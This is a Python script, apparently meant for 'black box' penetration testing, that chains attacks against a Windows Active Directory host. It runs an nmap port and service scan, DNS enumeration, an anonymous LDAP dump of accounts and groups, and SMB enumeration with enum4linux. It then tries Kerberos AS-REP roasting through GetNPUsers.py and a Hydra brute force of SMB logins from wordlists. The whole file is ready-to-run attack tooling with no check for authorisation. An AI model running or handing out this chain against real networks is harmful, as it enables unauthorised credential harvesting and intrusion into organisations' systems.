import subprocess
import socket
import sys
from ldap3 import Server, Connection, ALL

def network_scan(target):
    print(f"[*] Performing network scan on {target}...")
    try:
        subprocess.run(["nmap", "-p 88,389,445,636,3268,5985", "-sV", "-O", target], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error performing network scan: {e}")

def dns_enum(domain):
    print(f"[*] Performing DNS enumeration on {domain}...")
    try:
        subprocess.run(["dnsenum", "--enum", domain], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error performing DNS enumeration: {e}")

def ldap_enum(domain_controller, username, password):
    print(f"[*] Attempting LDAP enumeration on {domain_controller}...")
    try:
        server = Server(domain_controller, get_info=ALL)
        conn = Connection(server, user=username, password=password, auto_bind=True)
        conn.search('dc=domain,dc=com', '(objectClass=*)', attributes=['sAMAccountName', 'memberOf'])
        for entry in conn.entries:
            print(entry)
    except Exception as e:
        print(f"[!] Error performing LDAP enumeration: {e}")

def smb_enum(target):
    print(f"[*] Performing SMB enumeration on {target}...")
    try:
        subprocess.run(["enum4linux", "-a", target], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error performing SMB enumeration: {e}")

def kerberos_bruteforce(target, user_list):
    print(f"[*] Performing Kerberos bruteforce attack on {target}...")
    try:
        subprocess.run(["python3", "GetNPUsers.py", f"{target}/", "-usersfile", user_list, "-no-pass", "-dc-ip", target], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error performing Kerberos bruteforce: {e}")

def smb_login_bruteforce(target, user_list, password_list):
    print(f"[*] Performing SMB login bruteforce on {target}...")
    try:
        subprocess.run(["hydra", "-L", user_list, "-P", password_list, f"smb://{target}"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error performing SMB login bruteforce: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 black_box_test.py <target_domain_or_IP>")
        sys.exit(1)

    target = sys.argv[1]
    domain = target if '.' in target else None

    network_scan(target)

    if domain:
        dns_enum(domain)

    ldap_enum(target, "anonymous", "")

    smb_enum(target)

    user_list = "usernames.txt" 
    password_list = "passwords.txt" 

    kerberos_bruteforce(target, user_list)

    smb_login_bruteforce(target, user_list, password_list)

if __name__ == "__main__":
    main()
